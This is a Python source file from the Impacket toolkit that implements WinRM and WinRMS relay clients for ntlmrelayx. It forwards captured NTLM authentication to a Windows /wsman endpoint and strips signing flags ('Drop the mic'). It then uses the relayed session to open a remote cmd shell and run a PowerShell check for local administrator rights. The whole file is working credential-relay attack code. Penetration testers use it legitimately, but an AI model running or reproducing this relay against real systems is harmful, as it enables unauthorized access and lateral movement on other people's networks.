# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2022 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   WinRM Protocol Client
#   WinRM for HTTPS client for relaying NTLMSSP authentication
#
# Authors:
#   Joe Mondloch (jmk@foofus.net)
#   Aurélien Chalot (@Defte_)

import re
import ssl
try:
    from http.client import HTTPConnection, HTTPSConnection
except ImportError:
    from httplib import HTTPConnection, HTTPSConnection
import base64

from struct import unpack
from impacket import LOG
from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN
from impacket.spnego import SPNEGO_NegTokenResp

PROTOCOL_CLIENT_CLASSES = ["WinRMRelayClient", "WinRMSRelayClient"]

class WinRMRelayClient(ProtocolClient):
    PLUGIN_NAME = "WINRM"

    def __init__(self, serverConfig, target, targetPort = 5985, extendedSecurity=True):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.server = None
        self.authenticationMethod = None
        self.isFirstNeg = True
        self.basic_xml_data = "<xml></xml>"

    def initConnection(self):
        self.session = HTTPConnection(self.targetHost, self.targetPort)
        self.lastresult = None
        if self.target.path == "":
            self.path = "/wsman"
        else:
            self.path = self.target.path
        return True

    def sendNegotiate(self, negotiateMessage):
        negoMessage = NTLMAuthNegotiate()
        negoMessage.fromString(negotiateMessage)

        # Drop the mic exploit
        # WinRMs servers is configured to use CBT if client requests it which is the case of SMB with NTLMv2 (as I found out quite hard :D)
        if self.serverConfig.remove_mic:
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN

        self.negotiateMessage = negoMessage.getData()

        # Warn if the relayed target requests signing, which will break our attack
        if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
            LOG.warning('The client requested signing, relaying to WinRMS migh not work!')

        headers = {
            "Content-Length": len(self.basic_xml_data),
            "Content-Type": "application/soap+xml;charset=UTF-8"
        }
        self.session.request("POST", self.path, headers=headers, body=self.basic_xml_data)
        res = self.session.getresponse()
        res.read()

        if res.status != 401:
            LOG.info(f"Status code returned: {res.status}. Authentication does not seem required for URL")
        try:
            if "NTLM" not in res.getheader("WWW-Authenticate") and "Negotiate" not in res.getheader("WWW-Authenticate"):
                LOG.error(f"NTLM Auth not offered by URL, offered protocols: {res.getheader('WWW-Authenticate')}")
                return False
            if "NTLM" in res.getheader("WWW-Authenticate"):
                self.authenticationMethod = "NTLM"
            elif "Negotiate" in res.getheader("WWW-Authenticate"):
                self.authenticationMethod = "Negotiate"
        except (KeyError, TypeError):
            LOG.error(f"No authentication requested by the server for url {self.targetHost}")
            if self.serverConfig.isADCSAttack:
                LOG.info("IIS cert server may allow anonymous authentication, sending NTLM auth anyways")
                self.authenticationMethod = "NTLM"
            else:
                return False

        negotiate = base64.b64encode(negotiateMessage).decode("ascii")
        headers = {
            "Authorization": f"{self.authenticationMethod} {negotiate}",
            "Content-Type": "application/soap+xml;charset=UTF-8",
            "Content-Length": len(self.basic_xml_data)
        }
        self.session.request("POST", self.path, headers=headers, body=self.basic_xml_data)
        res = self.session.getresponse()
        res.read()

        try:
            serverChallengeBase64 = re.search(('%s ([a-zA-Z0-9+/]+={0,2})' % self.authenticationMethod), res.getheader('WWW-Authenticate')).group(1)
            serverChallenge = base64.b64decode(serverChallengeBase64)
            challenge = NTLMAuthChallenge()
            challenge.fromString(serverChallenge)
            return challenge
        except (IndexError, KeyError, AttributeError):
            LOG.error("No NTLM challenge returned from server")
            return False

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if unpack("B", authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2["ResponseToken"]
        else:
            token = authenticateMessageBlob

        auth = base64.b64encode(token).decode("ascii")
        headers = {
            "Authorization": f"{self.authenticationMethod} {auth}",
            "Content-Type": "application/soap+xml;charset=UTF-8",
            "Content-Length": len(self.basic_xml_data)
        }
        self.session.request("POST", self.path, headers=headers, body=self.basic_xml_data)

        res = self.session.getresponse()
        if res.status == 401:
            return None, STATUS_ACCESS_DENIED
        else:
            LOG.info(f"HTTP server returned error code {res.status}, this is expected, treating as a successful login")
            self.lastresult = res.read()
            return None, STATUS_SUCCESS

    def killConnection(self):
        if self.session is not None:
            self.session.close()
            self.session = None

    def isAdmin(self):
        initiate_shell = '''
        <?xml version="1.0" encoding="utf-8"?>
            <env:Envelope
                xmlns:env="http://www.w3.org/2003/05/soap-envelope"
                xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
                xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
                xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"
                xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
                <env:Header>
                    <a:To>http://windows-host:5985/wsman</a:To>
                    <a:ReplyTo>
                        <a:Address mustUnderstand="true">
                            http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous
                        </a:Address>
                    </a:ReplyTo>
                    <a:MessageID>uuid:2a8ac24f-00f0-4a87-860c-bf58d33a1e0a</a:MessageID>
                    <a:Action mustUnderstand="true">
                        http://schemas.xmlsoap.org/ws/2004/09/transfer/Create
                    </a:Action>
                    <w:ResourceURI mustUnderstand="true">
                        http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd
                    </w:ResourceURI>
                    <w:OperationTimeout>PT20S</w:OperationTimeout>
                    <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>
                    <w:OptionSet>
                        <w:Option Name="WINRS_NOPROFILE">FALSE</w:Option>
                        <w:Option Name="WINRS_CODEPAGE">437</w:Option>
                    </w:OptionSet>
                    <w:Locale xml:lang="en-US"/>
                    <p:DataLocale xml:lang="en-US"/>
                </env:Header>
                <env:Body>
                    <rsp:Shell>
                        <rsp:InputStreams>stdin</rsp:InputStreams>
                        <rsp:OutputStreams>stdout stderr</rsp:OutputStreams>
                    </rsp:Shell>
                </env:Body>
            </env:Envelope>
        '''

        headers = {
          "Content-Length": len(initiate_shell),
          "Content-Type": "application/soap+xml;charset=UTF-8"
        }

        self.session.request("POST", self.path, headers=headers, body=initiate_shell)
        res = self.session.getresponse()

        match = re.search(r'<w:Selector\s+Name="ShellId">(.*?)</w:Selector>', res.read().decode())
        if match:
            shell_id = match.group(1)
            get_command_id = f'''
            <?xml version="1.0" encoding="utf-8"?>
            <env:Envelope
                xmlns:env="http://www.w3.org/2003/05/soap-envelope"
                xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
                xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
                xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
                <env:Header>
                    <a:To>http://windows-host:5985/wsman</a:To>
                    <a:ReplyTo>
                        <a:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
                    </a:ReplyTo>
                    <a:Action mustUnderstand="true">
                        http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command
                    </a:Action>
                    <a:MessageID>uuid:10000000-0000-0000-0000-000000000002</a:MessageID>
                    <w:ResourceURI mustUnderstand="true">
                        http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd
                    </w:ResourceURI>
                    <w:SelectorSet>
                        <w:Selector Name="ShellId">{shell_id}</w:Selector>
                    </w:SelectorSet>
                </env:Header>
                <env:Body>
                    <rsp:CommandLine>
                        <rsp:Command>powershell -c "[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match 'S-1-5-32-544')"</rsp:Command>
                    </rsp:CommandLine>
                </env:Body>
            </env:Envelope>
            '''

            headers = {
                "Content-Length": len(get_command_id),
                "Content-Type": "application/soap+xml;charset=UTF-8"
            }

            self.session.request("POST", self.path, headers=headers, body=get_command_id)
            res = self.session.getresponse()
            match = re.search(r'<rsp:CommandId>(.*?)</rsp:CommandId>', res.read().decode())
            if match:
                command_id = match.group(1)
                check_if_admin = f'''
                <?xml version="1.0" encoding="utf-8"?>
                    <env:Envelope
                        xmlns:env="http://www.w3.org/2003/05/soap-envelope"
                        xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
                        xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
                        xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
                        <env:Header>
                            <a:To>http://windows-host:5985/wsman</a:To>
                            <a:ReplyTo>
                                <a:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
                            </a:ReplyTo>
                            <a:Action mustUnderstand="true">
                                http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive
                            </a:Action>
                            <a:MessageID>uuid:10000000-0000-0000-0000-000000000003</a:MessageID>
                            <w:ResourceURI mustUnderstand="true">
                                http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd
                            </w:ResourceURI>
                            <w:SelectorSet>
                                <w:Selector Name="ShellId">{shell_id}</w:Selector>
                            </w:SelectorSet>
                        </env:Header>
                        <env:Body>
                            <rsp:Receive>
                                <rsp:DesiredStream CommandId="{command_id}">stdout stderr</rsp:DesiredStream>
                            </rsp:Receive>
                        </env:Body>
                    </env:Envelope>
                '''

                headers = {
                    "Content-Length": len(check_if_admin),
                    "Content-Type": "application/soap+xml;charset=UTF-8"
                }

                self.session.request("POST", self.path, headers=headers, body=check_if_admin)
                res = self.session.getresponse()
                body = res.read().decode()

                stdout_matches = re.findall(r'<rsp:Stream\s+Name="stdout"[^>]*>(.*?)</rsp:Stream>', body)
                decoded_output = ''.join([base64.b64decode(match).decode("utf-8") for match in stdout_matches])

                # This request is used to clean up the shell
                destroy_shell = f'''
                <?xml version="1.0" encoding="utf-8"?>
                <env:Envelope
                    xmlns:env="http://www.w3.org/2003/05/soap-envelope"
                    xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
                    xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">
                    <env:Header>
                        <a:To>http://windows-host:5985/wsman</a:To>
                        <a:ReplyTo>
                            <a:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
                        </a:ReplyTo>
                        <a:Action mustUnderstand="true">
                            http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete
                        </a:Action>
                        <a:MessageID>uuid:10000000-0000-0000-0000-000000000004</a:MessageID>
                        <w:ResourceURI mustUnderstand="true">
                            http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd
                        </w:ResourceURI>
                        <w:SelectorSet>
                            <w:Selector Name="ShellId">{shell_id}</w:Selector>
                        </w:SelectorSet>
                    </env:Header>
                    <env:Body/>
                </env:Envelope>
                '''

                headers = {
                    "Content-Length": len(destroy_shell),
                    "Content-Type": "application/soap+xml;charset=UTF-8"
                }

                self.session.request("POST", self.path, headers=headers, body=destroy_shell)
                res = self.session.getresponse()   
                res.read()

                # However we want to return if the relayed user is admin or not :D
                if decoded_output.strip() == "True":
                    return "TRUE"
                else:
                    return "FALSE"

    def keepAlive(self):
        heartbeat_xml = '''
        <?xml version="1.0" encoding="utf-8"?>
            <env:Envelope
                xmlns:env="http://www.w3.org/2003/05/soap-envelope"
                xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
                xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
                xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"
                xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
                <env:Header>
                    <a:To>http://windows-host:5985/wsman</a:To>
                    <a:ReplyTo>
                        <a:Address mustUnderstand="true">
                            http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous
                        </a:Address>
                    </a:ReplyTo>
                    <a:MessageID>uuid:2a8ac24f-00f0-4a87-860c-bf58d33a1e0a</a:MessageID>
                    <a:Action mustUnderstand="true">
                        http://schemas.xmlsoap.org/ws/2004/09/transfer/Create
                    </a:Action>
                    <w:ResourceURI mustUnderstand="true">
                        http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd
                    </w:ResourceURI>
                    <w:OperationTimeout>PT20S</w:OperationTimeout>
                    <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>
                    <w:OptionSet>
                        <w:Option Name="WINRS_NOPROFILE">FALSE</w:Option>
                        <w:Option Name="WINRS_CODEPAGE">437</w:Option>
                    </w:OptionSet>
                    <w:Locale xml:lang="en-US"/>
                    <p:DataLocale xml:lang="en-US"/>
                </env:Header>
                <env:Body>
                    <rsp:Shell>
                        <rsp:InputStreams>stdin</rsp:InputStreams>
                        <rsp:OutputStreams>stdout stderr</rsp:OutputStreams>
                    </rsp:Shell>
                </env:Body>
            </env:Envelope>
       '''

        headers = {
            "Content-Length": len(heartbeat_xml),
            "Content-Type": "application/soap+xml;charset=UTF-8"
        }

        self.session.request("POST", self.path, headers=headers, body=heartbeat_xml)
        res = self.session.getresponse()
        res.read()

class WinRMSRelayClient(WinRMRelayClient):
    PLUGIN_NAME = "WINRMS"

    def __init__(self, serverConfig, target, targetPort = 5986, extendedSecurity=True ):
        WinRMRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self):
        self.lastresult = None
        if self.target.path == "":
            self.path = "/wsman"
        else:
            self.path = self.target.path
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            self.session = HTTPSConnection(self.targetHost, self.targetPort, context=uv_context)
        except AttributeError:
            self.session = HTTPSConnection(self.targetHost, self.targetPort)
        return True

